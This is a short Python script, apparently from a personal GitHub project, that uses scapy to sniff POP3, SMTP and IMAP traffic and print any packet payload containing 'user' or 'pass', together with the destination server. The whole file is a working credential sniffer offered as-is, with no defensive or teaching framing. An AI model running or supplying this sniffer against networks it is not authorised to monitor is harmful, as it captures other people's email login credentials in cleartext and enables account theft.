#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Matheus Fidelis aka D0ctor
# Github: https://github.com/msfidelis

from scapy.all import *

def sniff_callback(packet):

    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: %s' % packet[IP].dst
            print '[*] %s' %packet[TCP].payload

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=sniff_callback, store=0)
